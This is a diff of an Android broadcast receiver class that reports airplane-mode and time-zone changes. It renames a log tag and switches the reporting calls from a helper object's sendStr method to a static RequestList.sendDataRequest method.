@@ -10,9 +10,10 @@ import android.content.res.Resources;
 import android.provider.Settings;
 
 import com.inet.android.certificate.R;
+import com.inet.android.request.RequestList;
 
 public class BatteryTimeReceiver extends BroadcastReceiver {
-	private String TAG = BatteryTimeReceiver.class.getSimpleName().toString();
+	private String LOG_TAG = BatteryTimeReceiver.class.getSimpleName().toString();
 	IntentFilter ifilter;
 	Intent batteryIntent;
 	Context mContext;
@@ -21,8 +22,7 @@ public class BatteryTimeReceiver extends BroadcastReceiver {
 	@Override
 	public void onReceive(Context context, Intent intent) {
 		this.mContext = context;
-		CreateServiceInformation serviceInfo = new CreateServiceInformation(
-				mContext);
+		
 		Resources path = mContext.getApplicationContext().getResources();
 		
 		if (intent.getAction().equals(Intent.ACTION_POWER_CONNECTED)) {
@@ -44,20 +44,19 @@ public class BatteryTimeReceiver extends BroadcastReceiver {
 					.getApplicationContext().getContentResolver(),
 					Settings.System.AIRPLANE_MODE_ON, 0) == 1;
 			if (isEnabled) {
-
-				serviceInfo.sendStr(path.getString(R.string.airplane),
-						path.getString(R.string.mode_on));
+				RequestList.sendDataRequest(path.getString(R.string.airplane),
+						path.getString(R.string.mode_on), mContext);
 			} else {
-				serviceInfo.sendStr(path.getString(R.string.airplane),
-						path.getString(R.string.mode_off));
+				RequestList.sendDataRequest(path.getString(R.string.airplane),
+						path.getString(R.string.mode_off), mContext);
 			}
 
 		} else if (intent.getAction().equals(Intent.ACTION_TIMEZONE_CHANGED)
 				|| intent.getAction().equals(Intent.ACTION_TIME_CHANGED)) {
 			TimeZone tz = TimeZone.getDefault();
-			serviceInfo.sendStr(path.getString(R.string.time_zone),
+			RequestList.sendDataRequest(path.getString(R.string.time_zone),
 					tz.getDisplayName(false, TimeZone.SHORT)
-							+ ", " + tz.getID());
+							+ ", " + tz.getID(), mContext);
 		}
 	}
 
